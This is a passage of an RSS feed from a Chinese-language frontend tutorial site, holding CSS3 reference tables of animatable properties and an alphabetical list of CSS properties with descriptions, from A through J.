<li><a href="/languages/css3/references/animatable.html" target="blank">动画属性</a></li>
<li><a href="/languages/css3/references/websafe_fonts.html" target="blank">网络安全字体</a></li>
<li><a href="/languages/css3/references/units.html" target="blank">单位</a></li>
<li><a href="/languages/css3/references/colors.html" target="blank">颜色</a></li>
<li><a href="/languages/css3/references/default_values.html" target="blank">默认值</a></li>
<li><a href="/languages/css3/references/entities.html" target="blank">实体</a></li>
<li><a href="/languages/css3/references/aural.html" target="blank">听觉</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>动画属性</title>
      <link>https://sankgao.github.io/languages/css3/references/animatable.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/animatable.html</guid>
      <source url="https://sankgao.github.io/rss.xml">动画属性</source>
      <description>定义和用法 一些 CSS 属性可用于动画制作，这意味着它们可用于过渡等效果中。 可设置动画的属性可以从一个值逐渐更改为另一个值。例如：尺寸、数字、百分比和颜色。 动画相关属性 属性名 描述 :----: :---- background 试一试 background-color 试一试 background-position 试一试 backgroun...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 定义和用法</h2>
<p>一些 CSS 属性可用于动画制作，这意味着它们可用于过渡等效果中。</p>
<p>可设置动画的属性可以从一个值逐渐更改为另一个值。例如：尺寸、数字、百分比和颜色。</p>
<h2> 动画相关属性</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">background</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">background-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">background-position</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">background-size</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-bottom</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-left-radius</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-right-radius</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-left</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-left-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-left-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-right</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-right-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-right-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-spacing</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-top</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-top-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-top-left-radius</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-top-right-radius</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">border-top-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">bottom</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">box-shadow</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">clip</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">column-count</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">column-gap</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">column-rule</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">column-rule-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">column-rule-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">column-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">columns</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">filter</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">flex</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">flex-basis</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">flex-grow</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">flex-shrink</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">font</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">font-size</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">font-size-adjust</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">font-stretch</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">font-weight</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-area</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-auto-columns</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-auto-flow</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-auto-rows</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-column</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-column-end</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-column-gap</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-column-start</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-gap</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-row</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-row-end</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-row-gap</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-row-start</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-template</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-template-areas</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-template-columns</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">grid-template-rows</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">height</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">left</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">letter-spacing</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">line-height</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">margin</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">margin-bottom</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">margin-left</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">margin-right</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">margin-top</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">max-height</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">max-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">min-height</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">min-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">object-position</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">opacity</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">order</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">outline</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">outline-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">outline-offset</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">outline-width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">padding</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">padding-bottom</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">padding-left</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">padding-right</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">padding-top</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">perspective</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">perspective-origin</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">right</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">text-decoration-color</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">text-indent</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">text-shadow</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">top</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">transform</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">transform-origin</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">vertical-align</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">visibility</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">width</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">word-spacing</td>
<td style="text-align:left">试一试</td>
</tr>
<tr>
<td style="text-align:center">z-index</td>
<td style="text-align:left">试一试</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>属性</title>
      <link>https://sankgao.github.io/languages/css3/references/attributes.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/attributes.html</guid>
      <source url="https://sankgao.github.io/rss.xml">属性</source>
      <description>按字母排序 A 属性名 描述 :----: :---- align-content 规定弹性容器内的行之间的对齐方式，当项目不使用所有可用空间时 align-items 规定弹性容器内项目的对齐方式 align-self 规定弹性容器内所选项目的对齐方式 all 重置所有属性（除了 unicode-bidi 和 direction） animation...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>按字母排序</p>
<h2> A</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">align-content</td>
<td style="text-align:left">规定弹性容器内的行之间的对齐方式，当项目不使用所有可用空间时</td>
</tr>
<tr>
<td style="text-align:center">align-items</td>
<td style="text-align:left">规定弹性容器内项目的对齐方式</td>
</tr>
<tr>
<td style="text-align:center">align-self</td>
<td style="text-align:left">规定弹性容器内所选项目的对齐方式</td>
</tr>
<tr>
<td style="text-align:center">all</td>
<td style="text-align:left">重置所有属性（除了 unicode-bidi 和 direction）</td>
</tr>
<tr>
<td style="text-align:center">animation</td>
<td style="text-align:left">所有 animation-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">animation-delay</td>
<td style="text-align:left">规定开始动画的延迟</td>
</tr>
<tr>
<td style="text-align:center">animation-direction</td>
<td style="text-align:left">规定动画是向前播放、向后播放还是交替播放</td>
</tr>
<tr>
<td style="text-align:center">animation-duration</td>
<td style="text-align:left">规定动画完成一个周期应花费的时间</td>
</tr>
<tr>
<td style="text-align:center">animation-fill-mode</td>
<td style="text-align:left">规定元素在不播放动画时（在开始之前、结束之后、或同时）的样式</td>
</tr>
<tr>
<td style="text-align:center">animation-iteration-count</td>
<td style="text-align:left">规定动画的播放次数</td>
</tr>
<tr>
<td style="text-align:center">animation-name</td>
<td style="text-align:left">规定 @keyframes 动画的名称</td>
</tr>
<tr>
<td style="text-align:center">animation-play-state</td>
<td style="text-align:left">规定动画是播放还是暂停</td>
</tr>
<tr>
<td style="text-align:center">animation-timing-function</td>
<td style="text-align:left">规定动画的速度曲线</td>
</tr>
</tbody>
</table>
<h2> B</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">backface-visibility</td>
<td style="text-align:left">定义当面对用户时元素的背面是否应可见</td>
</tr>
<tr>
<td style="text-align:center">background</td>
<td style="text-align:left">所有 background-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">background-attachment</td>
<td style="text-align:left">设置背景图像是与页面的其余部分一起滚动还是固定的</td>
</tr>
<tr>
<td style="text-align:center">background-blend-mode</td>
<td style="text-align:left">规定每个背景图层（颜色/图像）的混合模式</td>
</tr>
<tr>
<td style="text-align:center">background-clip</td>
<td style="text-align:left">定义背景（颜色或图像）应在元素内延伸的距离</td>
</tr>
<tr>
<td style="text-align:center">background-color</td>
<td style="text-align:left">规定元素的背景色</td>
</tr>
<tr>
<td style="text-align:center">background-image</td>
<td style="text-align:left">规定元素的一幅或多幅背景图像</td>
</tr>
<tr>
<td style="text-align:center">background-origin</td>
<td style="text-align:left">规定背景图像的初始位置</td>
</tr>
<tr>
<td style="text-align:center">background-position</td>
<td style="text-align:left">规定背景图像的位置</td>
</tr>
<tr>
<td style="text-align:center">background-repeat</td>
<td style="text-align:left">设置是否以及如何重复背景图像</td>
</tr>
<tr>
<td style="text-align:center">background-size</td>
<td style="text-align:left">规定背景图像的尺寸</td>
</tr>
<tr>
<td style="text-align:center">border</td>
<td style="text-align:left">border-width、border-style 以及 border-color 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-bottom</td>
<td style="text-align:left">border-bottom-width、border-bottom-style 以及 border-bottom-color 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-color</td>
<td style="text-align:left">设置下边框的颜色</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-left-radius</td>
<td style="text-align:left">定义左下角的边框圆角</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-right-radius</td>
<td style="text-align:left">定义右下角的边框圆角</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-style</td>
<td style="text-align:left">设置下边框的样式</td>
</tr>
<tr>
<td style="text-align:center">border-bottom-width</td>
<td style="text-align:left">设置下边框的宽度</td>
</tr>
<tr>
<td style="text-align:center">border-collapse</td>
<td style="text-align:left">设置表格边框是折叠为单一边框还是分开的</td>
</tr>
<tr>
<td style="text-align:center">border-color</td>
<td style="text-align:left">设置四条边框的颜色</td>
</tr>
<tr>
<td style="text-align:center">border-image</td>
<td style="text-align:left">border-image-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-image-outset</td>
<td style="text-align:left">规定边框图像区域超出边框的量</td>
</tr>
<tr>
<td style="text-align:center">border-image-repeat</td>
<td style="text-align:left">规定边框图像应重复、圆角、还是拉伸</td>
</tr>
<tr>
<td style="text-align:center">border-image-slice</td>
<td style="text-align:left">规定如何裁切边框图像</td>
</tr>
<tr>
<td style="text-align:center">border-image-source</td>
<td style="text-align:left">规定用作边框的图像的路径</td>
</tr>
<tr>
<td style="text-align:center">border-image-width</td>
<td style="text-align:left">规定边框图像的宽度</td>
</tr>
<tr>
<td style="text-align:center">border-left</td>
<td style="text-align:left">所有 border-left-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-left-color</td>
<td style="text-align:left">设置左边框的颜色</td>
</tr>
<tr>
<td style="text-align:center">border-left-style</td>
<td style="text-align:left">设置左边框的样式</td>
</tr>
<tr>
<td style="text-align:center">border-left-width</td>
<td style="text-align:left">设置左边框的宽度</td>
</tr>
<tr>
<td style="text-align:center">border-radius</td>
<td style="text-align:left">四个 border-*-radius 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-right</td>
<td style="text-align:left">所有 border-right-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-right-color</td>
<td style="text-align:left">设置右边框的颜色</td>
</tr>
<tr>
<td style="text-align:center">border-right-style</td>
<td style="text-align:left">设置右边框的样式</td>
</tr>
<tr>
<td style="text-align:center">border-right-width</td>
<td style="text-align:left">设置右边框的宽度</td>
</tr>
<tr>
<td style="text-align:center">border-spacing</td>
<td style="text-align:left">设置相邻单元格边框之间的距离</td>
</tr>
<tr>
<td style="text-align:center">border-style</td>
<td style="text-align:left">设置四条边框的样式</td>
</tr>
<tr>
<td style="text-align:center">border-top</td>
<td style="text-align:left">border-top-width、border-top-style 以及 border-top-color 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">border-top-color</td>
<td style="text-align:left">设置上边框的颜色</td>
</tr>
<tr>
<td style="text-align:center">border-top-left-radius</td>
<td style="text-align:left">定义左上角的边框圆角</td>
</tr>
<tr>
<td style="text-align:center">border-top-right-radius</td>
<td style="text-align:left">定义右上角的边框圆角</td>
</tr>
<tr>
<td style="text-align:center">border-top-style</td>
<td style="text-align:left">设置上边框的样式</td>
</tr>
<tr>
<td style="text-align:center">border-top-width</td>
<td style="text-align:left">设置上边框的宽度</td>
</tr>
<tr>
<td style="text-align:center">border-width</td>
<td style="text-align:left">设置四条边框的宽度</td>
</tr>
<tr>
<td style="text-align:center">bottom</td>
<td style="text-align:left">设置元素相对于其父元素底部的位置</td>
</tr>
<tr>
<td style="text-align:center">box-decoration-break</td>
<td style="text-align:left">设置元素在分页符处的背景和边框的行为，或对于行内元素在换行符处的行为</td>
</tr>
<tr>
<td style="text-align:center">box-shadow</td>
<td style="text-align:left">将一个或多个阴影附加到元素</td>
</tr>
<tr>
<td style="text-align:center">box-sizing</td>
<td style="text-align:left">定义元素的宽度和高度的计算方式：它们是否应包含内边距和边框</td>
</tr>
<tr>
<td style="text-align:center">break-after</td>
<td style="text-align:left">规定指定元素之后是否应出现 page-、column- 或 region-break</td>
</tr>
<tr>
<td style="text-align:center">break-before</td>
<td style="text-align:left">规定指定元素之前是否应出现 page-、column- 或 region-break</td>
</tr>
<tr>
<td style="text-align:center">break-inside</td>
<td style="text-align:left">规定指定元素内部是否应出现 page-、column- 或 region-break</td>
</tr>
</tbody>
</table>
<h2> C</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">caption-side</td>
<td style="text-align:left">规定表格标题的放置方式</td>
</tr>
<tr>
<td style="text-align:center">caret-color</td>
<td style="text-align:left">规定光标在 input、textarea 或任何可编辑元素中的颜色</td>
</tr>
<tr>
<td style="text-align:center">@charset</td>
<td style="text-align:left">规定样式表中使用的字符编码</td>
</tr>
<tr>
<td style="text-align:center">clear</td>
<td style="text-align:left">规定不允许在元素的哪一侧浮动元</td>
</tr>
<tr>
<td style="text-align:center">clip</td>
<td style="text-align:left">剪裁绝对定位的元素</td>
</tr>
<tr>
<td style="text-align:center">clip-path</td>
<td style="text-align:left">将元素裁剪为基本形状或 SVG 源</td>
</tr>
<tr>
<td style="text-align:center">color</td>
<td style="text-align:left">设置文本的颜色</td>
</tr>
<tr>
<td style="text-align:center">column-count</td>
<td style="text-align:left">规定元素应分为的列数</td>
</tr>
<tr>
<td style="text-align:center">column-fill</td>
<td style="text-align:left">指定如何填充列（是否 balanced）</td>
</tr>
<tr>
<td style="text-align:center">column-gap</td>
<td style="text-align:left">规定列间隙</td>
</tr>
<tr>
<td style="text-align:center">column-rule</td>
<td style="text-align:left">所有 column-rule-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">column-rule-color</td>
<td style="text-align:left">规定列之间规则的颜色</td>
</tr>
<tr>
<td style="text-align:center">column-rule-style</td>
<td style="text-align:left">规定列之间的规则样式</td>
</tr>
<tr>
<td style="text-align:center">column-rule-width</td>
<td style="text-align:left">规定列之间的规则宽度</td>
</tr>
<tr>
<td style="text-align:center">column-span</td>
<td style="text-align:left">规定元素应该跨越多少列</td>
</tr>
<tr>
<td style="text-align:center">column-width</td>
<td style="text-align:left">规定列宽度</td>
</tr>
<tr>
<td style="text-align:center">columns</td>
<td style="text-align:left">column-width 和 column-count 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">content</td>
<td style="text-align:left">与 :before 和 :after 伪元素一起使用，来插入生成的内容</td>
</tr>
<tr>
<td style="text-align:center">counter-increment</td>
<td style="text-align:left">增加或减少一个或多个 CSS 计数器的值</td>
</tr>
<tr>
<td style="text-align:center">counter-reset</td>
<td style="text-align:left">创建或重置一个或多个 CSS 计数器</td>
</tr>
<tr>
<td style="text-align:center">cursor</td>
<td style="text-align:left">规定当指向元素时要显示的鼠标光标</td>
</tr>
</tbody>
</table>
<h2> D</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">direction</td>
<td style="text-align:left">规定文本方向/书写方向</td>
</tr>
<tr>
<td style="text-align:center">display</td>
<td style="text-align:left">规定如何显示某个 HTML 元素</td>
</tr>
</tbody>
</table>
<h2> E</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">empty-cells</td>
<td style="text-align:left">规定是否在表格中的空白单元格上显示边框和背景</td>
</tr>
</tbody>
</table>
<h2> F</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">filter</td>
<td style="text-align:left">定义元素显示之前的效果（例如，模糊或颜色偏移）</td>
</tr>
<tr>
<td style="text-align:center">flex</td>
<td style="text-align:left">flex-grow、flex-shrink 以及 flex-basis 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">flex-basis</td>
<td style="text-align:left">规定弹性项目的初始长度</td>
</tr>
<tr>
<td style="text-align:center">flex-direction</td>
<td style="text-align:left">规定弹性项目的方向</td>
</tr>
<tr>
<td style="text-align:center">flex-flow</td>
<td style="text-align:left">flex-direction 和 flex-wrap 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">flex-grow</td>
<td style="text-align:left">规定项目相对于其余项目的增量</td>
</tr>
<tr>
<td style="text-align:center">flex-shrink</td>
<td style="text-align:left">规定项目相对于其余项目的减量</td>
</tr>
<tr>
<td style="text-align:center">flex-wrap</td>
<td style="text-align:left">规定弹性项目是否应该换行</td>
</tr>
<tr>
<td style="text-align:center">float</td>
<td style="text-align:left">规定是否应该对盒（box）进行浮动</td>
</tr>
<tr>
<td style="text-align:center">font</td>
<td style="text-align:left">font-style、font-variant、font-weight、font-size/line-height 以及 font-family 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">@font-face</td>
<td style="text-align:left">允许网站下载和使用 "web-safe" 字体以外的其他字体的规则</td>
</tr>
<tr>
<td style="text-align:center">font-family</td>
<td style="text-align:left">规定文本的字体族（字体系列）</td>
</tr>
<tr>
<td style="text-align:center">font-feature-settings</td>
<td style="text-align:left">允许控制 OpenType 字体中的高级印刷特性</td>
</tr>
<tr>
<td style="text-align:center">@font-feature-values</td>
<td style="text-align:left">允许创作者使用 font-variant-alternate 中的通用名来实现在 OpenType 中以不同方式激活的特性</td>
</tr>
<tr>
<td style="text-align:center">font-kerning</td>
<td style="text-align:left">控制字距调整信息的使用（字母间距）</td>
</tr>
<tr>
<td style="text-align:center">font-language-override</td>
<td style="text-align:left">控制特定语言的字形在字体的使用</td>
</tr>
<tr>
<td style="text-align:center">font-size</td>
<td style="text-align:left">规定文本的字体大小</td>
</tr>
<tr>
<td style="text-align:center">font-size-adjust</td>
<td style="text-align:left">保持发生字体回退时的可读性</td>
</tr>
<tr>
<td style="text-align:center">font-stretch</td>
<td style="text-align:left">从字体系列中选择一个普通的、压缩的或扩展的字体</td>
</tr>
<tr>
<td style="text-align:center">font-style</td>
<td style="text-align:left">规定文本的字体样式</td>
</tr>
<tr>
<td style="text-align:center">font-synthesis</td>
<td style="text-align:left">控制哪些缺失的字体（粗体或斜体）可以由浏览器合成</td>
</tr>
<tr>
<td style="text-align:center">font-variant</td>
<td style="text-align:left">规定是否应该以小型大写字体显示文本</td>
</tr>
<tr>
<td style="text-align:center">font-variant-alternates</td>
<td style="text-align:left">控制与 @font-feature-values 中定义的备用名称关联的备用字形的使用</td>
</tr>
<tr>
<td style="text-align:center">font-variant-caps</td>
<td style="text-align:left">控制大写字母的备用字形的使用</td>
</tr>
<tr>
<td style="text-align:center">font-variant-east-asian</td>
<td style="text-align:left">控制东亚文字（例如中文和日语）的备用字形的使用</td>
</tr>
<tr>
<td style="text-align:center">font-variant-ligatures</td>
<td style="text-align:left">控制在适用于元素的文本内容中使用哪些连字和上下文形式</td>
</tr>
<tr>
<td style="text-align:center">font-variant-numeric</td>
<td style="text-align:left">控制数字、分数和序号标记的备用字形的使用</td>
</tr>
<tr>
<td style="text-align:center">font-variant-position</td>
<td style="text-align:left">控制较小字体的替代字形的使用，这些字形相对于字体基线定位为上标或下标</td>
</tr>
<tr>
<td style="text-align:center">font-weight</td>
<td style="text-align:left">规定字体的粗细</td>
</tr>
</tbody>
</table>
<h2> G</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">grid</td>
<td style="text-align:left">grid-template-rows、grid-template-columns、grid-template-areas、grid-auto-rows、grid-auto-columns 以及 grid-auto-flow 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">grid-area</td>
<td style="text-align:left">即可规定网格项的名称，也可以是 grid-row-start、grid-column-start、grid-row-end 以及 grid-column-end 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">grid-auto-columns</td>
<td style="text-align:left">规定默认的列尺寸</td>
</tr>
<tr>
<td style="text-align:center">grid-auto-flow</td>
<td style="text-align:left">规定如何在网格中插入自动放置的项目</td>
</tr>
<tr>
<td style="text-align:center">grid-auto-rows</td>
<td style="text-align:left">规定默认的行尺寸</td>
</tr>
<tr>
<td style="text-align:center">grid-column</td>
<td style="text-align:left">grid-column-start 和 grid-column-end 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">grid-column-end</td>
<td style="text-align:left">规定如何结束网格项目</td>
</tr>
<tr>
<td style="text-align:center">grid-column-gap</td>
<td style="text-align:left">规定列间隙的尺寸</td>
</tr>
<tr>
<td style="text-align:center">grid-column-start</td>
<td style="text-align:left">规定网格项目从何处开始</td>
</tr>
<tr>
<td style="text-align:center">grid-gap</td>
<td style="text-align:left">grid-row-gap 和 grid-column-gap 的简写属性</td>
</tr>
<tr>
<td style="text-align:center">grid-row</td>
<td style="text-align:left">grid-row-start 和 grid-row-end 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">grid-row-end</td>
<td style="text-align:left">规定网格项目在何处结束</td>
</tr>
<tr>
<td style="text-align:center">grid-row-gap</td>
<td style="text-align:left">规定列间隙的尺寸</td>
</tr>
<tr>
<td style="text-align:center">grid-row-start</td>
<td style="text-align:left">规定网格项目从何处开始</td>
</tr>
<tr>
<td style="text-align:center">grid-template</td>
<td style="text-align:left">grid-template-rows、grid-template-columns 以及 grid-areas 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">grid-template-areas</td>
<td style="text-align:left">规定如何使用命名的网格项显示列和行</td>
</tr>
<tr>
<td style="text-align:center">grid-template-columns</td>
<td style="text-align:left">指定列的尺寸以及网格布局中的列数</td>
</tr>
<tr>
<td style="text-align:center">grid-template-rows</td>
<td style="text-align:left">指定网格布局中的行的尺寸</td>
</tr>
</tbody>
</table>
<h2> H</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">hanging-punctuation</td>
<td style="text-align:left">规定是否可以在行框外放置标点符号</td>
</tr>
<tr>
<td style="text-align:center">height</td>
<td style="text-align:left">设置元素的高度</td>
</tr>
<tr>
<td style="text-align:center">hyphens</td>
<td style="text-align:left">设置如何分割单词以改善段落的布局</td>
</tr>
</tbody>
</table>
<h2> I</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">image-rendering</td>
<td style="text-align:left">当图像被缩放时，向浏览器提供关于保留图像的哪些最重要的方面的信息</td>
</tr>
<tr>
<td style="text-align:center">@import</td>
<td style="text-align:left">允许您将样式表导入另一张样式表</td>
</tr>
<tr>
<td style="text-align:center">isolation</td>
<td style="text-align:left">定义元素是否必须创建新的堆叠内容</td>
</tr>
</tbody>
</table>
<h2> J</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">justify-content</td>
<td style="text-align:left">规定项目在弹性容器内的对齐方式，当项目未用到所有可用空间时</td>
</tr>
